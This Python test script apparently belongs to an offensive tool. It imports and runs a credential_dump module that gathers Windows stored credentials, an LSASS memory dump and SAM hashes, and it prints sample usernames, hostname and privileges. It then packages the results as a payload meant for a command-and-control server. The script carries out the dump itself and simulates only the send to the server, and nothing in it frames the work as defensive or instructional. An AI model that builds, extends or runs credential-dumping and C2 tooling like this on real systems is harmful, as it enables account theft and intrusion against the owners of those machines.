#!/usr/bin/env python3
"""
Test script to verify the complete credential dump flow
"""

import sys
import os
from pathlib import Path

# Add the modules directory to Python path
current_dir = Path(__file__).parent
modules_dir = current_dir / "modules"
if str(modules_dir) not in sys.path:
    sys.path.insert(0, str(modules_dir))

def test_credential_flow():
    """Test the complete credential dump flow"""
    print("🔐 Testing Complete Credential Dump Flow")
    print("=" * 50)
    
    try:
        # Test 1: Import credential dump function
        print("📥 Testing imports...")
        from modules.credential_dump import dump_credentials
        print("✅ Credential dump function imported successfully")
        
        # Test 2: Execute credential dump
        print("\n🧪 Executing credential dump...")
        result = dump_credentials()
        print(f"   Result status: {result.get('status')}")
        print(f"   Result type: {type(result)}")
        
        if result.get('status') == 'success':
            print("✅ Credential dump successful!")
            
            # Check data structure
            if 'data' in result:
                data = result['data']
                print(f"   Data keys: {list(data.keys())}")
                
                # Check Windows credentials
                if 'windows_credentials' in data:
                    win_creds = data['windows_credentials']
                    print(f"   Windows credentials status: {win_creds.get('status')}")
                    if 'credentials' in win_creds:
                        creds = win_creds['credentials']
                        print(f"   Credentials found: {len(creds)}")
                        if creds:
                            print(f"   Sample credential: {creds[0].get('target')} - {creds[0].get('username')}")
                
                # Check LSASS dump
                if 'lsass_dump' in data:
                    lsass = data['lsass_dump']
                    print(f"   LSASS dump status: {lsass.get('status')}")
                    if lsass.get('file_size'):
                        print(f"   LSASS dump size: {lsass.get('file_size')} bytes")
                
                # Check SAM hashes
                if 'sam_hashes' in data:
                    sam = data['sam_hashes']
                    print(f"   SAM hashes status: {sam.get('status')}")
                
                # Check security summary
                if 'security_summary' in result:
                    summary = result['security_summary']
                    print(f"   Hostname: {summary.get('hostname')}")
                    print(f"   Privileges: {summary.get('current_privileges')}")
                    print(f"   Credentials found: {summary.get('findings_summary', {}).get('stored_credentials', 0)}")
                
                # Check report file
                if 'report_file' in result:
                    report = result['report_file']
                    print(f"   Report file: {report.get('filename')}")
                    print(f"   Report size: {report.get('file_size')} bytes")
                    
            else:
                print("   No data field in result")
                
        else:
            print(f"❌ Credential dump failed: {result.get('error', 'Unknown error')}")
        
        print("\n✅ Credential dump flow test completed!")
        
        # Test 3: Check if result can be sent to C2 server
        print("\n📡 Testing C2 server compatibility...")
        try:
            # Simulate the result structure that would be sent to C2
            c2_payload = {
                'status': 'success',
                'data': result,
                'timestamp': '2025-08-17T15:50:00.000000',
                'type': 'credentials_dump'
            }
            
            print(f"   C2 payload status: {c2_payload.get('status')}")
            print(f"   C2 payload type: {c2_payload.get('type')}")
            print(f"   C2 payload has data: {'data' in c2_payload}")
            
            if 'data' in c2_payload['data']:
                print(f"   C2 payload data keys: {list(c2_payload['data']['data'].keys())}")
            
            print("✅ C2 server compatibility test passed!")
            
        except Exception as e:
            print(f"❌ C2 server compatibility test failed: {e}")
        
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("Make sure the credential_dump module is in the modules directory")
    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    test_credential_flow()
